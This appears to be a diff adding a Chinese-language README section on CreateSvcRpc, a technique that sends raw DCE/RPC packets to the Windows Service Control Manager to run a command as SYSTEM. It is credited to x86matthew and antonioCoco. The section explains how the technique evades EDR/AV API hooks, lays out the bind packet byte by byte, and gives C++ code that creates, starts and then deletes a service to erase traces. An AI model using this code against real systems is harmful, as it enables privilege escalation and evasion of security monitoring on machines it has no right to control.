@@ -254,3 +254,159 @@ Usage of gSigFlip.exe:
         the xor key you want to use
 ```
 
+## CreateSvcRpc
+
+**CreateSvcRpc** 是一种通过原始 RPC 协议直接操控 Windows 服务控制管理器 (SCM) 从而以 SYSTEM 权限执行命令的技术。该技术的原始 POC 由安全研究员 **x86matthew** 于 2022 年公开。随后，GitHub 用户 antonioCoco 在其项目 [SspiUacBypass](https://github.com/antonioCoco/SspiUacBypass/blob/main/CreateSvcRpc.cpp) 中提供了基于 x86matthew 代码修改而来的实现。
+
+### 核心原理
+
+其核心逻辑在于**直接进行 RPC 通信**，从而绕过高层 Win32 API。通常，EDR/AV 产品会 Hook `OpenSCManager()` 或 `CreateService()` 等标准 API 来监控服务创建行为。而 CreateSvcRpc 不调用这些 API，而是通过命名管道直接与 SCM 的 RPC 接口通信，手工构造 DCE/RPC 协议数据包。这种方式可以有效避开基于 API Hook 的检测机制。
+
+### RPC 协议实现细节
+
+该实现主要涉及以下组件：
+
+| 组件 | 说明 |
+| :--- | :--- |
+| **Bind Request** | 绑定到 `367abb81-9844-35f1-ad32-98f038001003` (SVCCTL v2.0) |
+| **NDR 传输语法** | `8a885d04-1ceb-11c9-9fe8-08002b104860` |
+| **请求/响应处理** | 手工序列化参数，需严格遵守 4 字节对齐规则 |
+
+#### DCE/RPC Bind 请求数据包布局
+
+整个 RPC Bind 请求包结构如下：
+
+```text
++---------------------------+
+|    RpcBaseHeader (16B)    |  ← 所有 RPC 包都有的公共头
++---------------------------+
+|  RpcBindRequestHeader     |  ← Bind 特有的参数
++---------------------------+
+|    Context Entry          |  ← 要绑定的接口信息
++---------------------------+
+```
+
+**RpcBaseHeader (16 字节)**
+
+| 偏移 | 大小 | 字段 | 值 | 说明 |
+| :--- | :--- | :--- | :--- | :--- |
+| 0x00 | 2 | `wVersion` | `0x0005` | DCE/RPC v5 |
+| 0x02 | 1 | `bPacketType` | `0x0B` (11) | Bind 请求 |
+| 0x03 | 1 | `bPacketFlags` | `0x03` | `PFC_FIRST_FRAG \| PFC_LAST_FRAG` |
+| 0x04 | 4 | `dwDataRepresentation` | `0x00000010` | Little-endian, ASCII, IEEE |
+| 0x08 | 2 | `wFragLength` | `72` | 整个包的长度 |
+| 0x0A | 2 | `wAuthLength` | `0` | 无认证数据 |
+| 0x0C | 4 | `dwCallIndex` | `1` | 调用序号 |
+
+**RpcBindRequestHeader (12 字节)**
+
+| 偏移 | 大小 | 字段 | 值 | 说明 |
+| :--- | :--- | :--- | :--- | :--- |
+| 0x10 | 2 | `wMaxSendFrag` | `4096` | 最大发送分片 |
+| 0x12 | 2 | `wMaxRecvFrag` | `4096` | 最大接收分片 |
+| 0x14 | 4 | `dwAssocGroup` | `0` | 关联组 (新连接为0) |
+| 0x18 | 1 | `bContextCount` | `1` | 上下文数量 |
+| 0x19 | 3 | `bAlign[3]` | `0,0,0` | 对齐填充 |
+
+**Context Entry (44 字节)**
+
+| 偏移 | 大小 | 字段 | 值 | 说明 |
+| :--- | :--- | :--- | :--- | :--- |
+| 0x1C | 2 | `wContextID` | `0` | 上下文 ID |
+| 0x1E | 2 | `wTransItemCount` | `1` | 传输语法数量 |
+| 0x20 | 16 | `bInterfaceUUID` | `367abb81...` | SVCCTL 接口 (UUID: `367abb81-9844-35f1-ad32-98f038001003`) |
+| 0x30 | 4 | `dwInterfaceVersion` | `0x00000002` | 版本 2.0 |
+| 0x34 | 16 | `bTransferSyntaxUUID` | `8a885d04...` | NDR 语法 (UUID: `8a885d04-1ceb-11c9-9fe8-08002b104860`) |
+| 0x44 | 4 | `dwTransferSyntaxVersion` | `0x00000002` | NDR v2 |
+
+### 代码实现片段
+
+以下是构造 RPC 请求并创建服务的关键代码逻辑：
+
+```cpp
+int InvokeCreateSvcRpcMain(char* pExecCmd)
+{
+    RpcConnectionStruct RpcConnection;
+    BYTE bServiceManagerObject[20];  // SCM 句柄 (RPC 上下文句柄, 固定20字节)
+    BYTE bServiceObject[20];         // 服务句柄
+    char szServiceName[256];
+    char szServiceCommandLine[256];
+
+    // 生成随机服务名，避免冲突
+    _snprintf(szServiceName, sizeof(szServiceName) - 1, 
+              "CreateSvcRpc_%u", GetTickCount());
+
+    // 关键: 用 "cmd /c start" 包装 payload
+    // 这样服务启动后立即返回，不会因超时报错
+    _snprintf(szServiceCommandLine, sizeof(szServiceCommandLine) - 1, 
+              "cmd /c start %s", pExecCmd);
+
+    //-------------------------------------------------------------------------
+    // Step 1: 连接 SVCCTL RPC 接口
+    // ntsvcs = SCM 的命名管道
+    // 367abb81-9844-35f1-ad32-98f038001003 = SVCCTL 接口 UUID (MS-SCMR 规范)
+    //-------------------------------------------------------------------------
+    if (RpcConnect("ntsvcs", "367abb81-9844-35f1-ad32-98f038001003", 2, &RpcConnection) != 0)
+        return 1;
+
+    //-------------------------------------------------------------------------
+    // Step 2: ROpenSCManagerW (Opnum 27) - 获取 SCM 句柄
+    //-------------------------------------------------------------------------
+    RpcInitialiseRequestData(&RpcConnection);
+    RpcAppendRequestData_Dword(&RpcConnection, 0);                    // lpMachineName = NULL
+    RpcAppendRequestData_Dword(&RpcConnection, 0);                    // lpDatabaseName = NULL  
+    RpcAppendRequestData_Dword(&RpcConnection, SC_MANAGER_ALL_ACCESS); // dwDesiredAccess
+    RpcSendRequest(&RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGER);       // Opnum 27
+    
+    // 响应前20字节是 SCM 句柄，后4字节是返回值
+    memcpy(bServiceManagerObject, &RpcConnection.bProcedureOutputData[0], 20);
+
+    //-------------------------------------------------------------------------
+    // Step 3: RCreateServiceW (Opnum 24) - 创建服务
+    // 这里手工序列化了 CreateService 的所有参数
+    //-------------------------------------------------------------------------
+    RpcInitialiseRequestData(&RpcConnection);
+    RpcAppendRequestData_Binary(&RpcConnection, bServiceManagerObject, 20);  // hSCManager
+    RpcAppendRequestData_Dword(&RpcConnection, dwServiceNameLength);         // 服务名长度
+    RpcAppendRequestData_Dword(&RpcConnection, 0);                           // (对齐填充)
+    RpcAppendRequestData_Dword(&RpcConnection, dwServiceNameLength);
+    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)szServiceName, dwServiceNameLength);
+    RpcAppendRequestData_Dword(&RpcConnection, 0);                           // lpDisplayName
+    RpcAppendRequestData_Dword(&RpcConnection, SERVICE_ALL_ACCESS);          // dwDesiredAccess
+    RpcAppendRequestData_Dword(&RpcConnection, SERVICE_WIN32_OWN_PROCESS);   // dwServiceType
+    RpcAppendRequestData_Dword(&RpcConnection, SERVICE_DEMAND_START);        // dwStartType (手动启动)
+    RpcAppendRequestData_Dword(&RpcConnection, SERVICE_ERROR_IGNORE);        // dwErrorControl
+    // ... lpBinaryPathName (我们的 payload 命令行) ...
+    RpcAppendRequestData_Binary(&RpcConnection, (BYTE*)szServiceCommandLine, dwServiceCommandLineLength);
+    // ... 其他参数 (LoadOrderGroup, Dependencies 等都设为 NULL) ...
+    RpcSendRequest(&RpcConnection, RPC_CMD_ID_CREATE_SERVICE);  // Opnum 24
+
+    // 响应: [0-3] TagId, [4-23] 服务句柄, [24-27] 返回值
+    memcpy(bServiceObject, &RpcConnection.bProcedureOutputData[4], 20);
+
+    //-------------------------------------------------------------------------
+    // Step 4: RStartServiceW (Opnum 31) - 启动服务
+    // 服务会以 SYSTEM 身份运行，执行我们的 payload
+    //-------------------------------------------------------------------------
+    RpcInitialiseRequestData(&RpcConnection);
+    RpcAppendRequestData_Binary(&RpcConnection, bServiceObject, 20);  // hService
+    RpcAppendRequestData_Dword(&RpcConnection, 0);                    // argc = 0
+    RpcAppendRequestData_Dword(&RpcConnection, 0);                    // argv = NULL
+    RpcSendRequest(&RpcConnection, RPC_CMD_ID_START_SERVICE);         // Opnum 31
+    
+    // 注意: 返回 ERROR_SERVICE_REQUEST_TIMEOUT (1053) 是正常的
+    // 因为我们的 "服务" 不是真正的服务程序，不会响应 SCM 的控制请求
+
+    //-------------------------------------------------------------------------
+    // Step 5: RDeleteService (Opnum 2) - 删除服务，清理痕迹
+    //-------------------------------------------------------------------------
+    RpcInitialiseRequestData(&RpcConnection);
+    RpcAppendRequestData_Binary(&RpcConnection, bServiceObject, 20);
+    RpcSendRequest(&RpcConnection, RPC_CMD_ID_DELETE_SERVICE);  // Opnum 2
+
+    RpcDisconnect(&RpcConnection);
+    return 0;
+}
+```
+
+根据[火绒安全的报告](https://www.huorong.cn/document/tech/vir_report/1846)，银狐木马正是利用此技术来加载 BYOVD 驱动，从而规避了常规的行为监控。
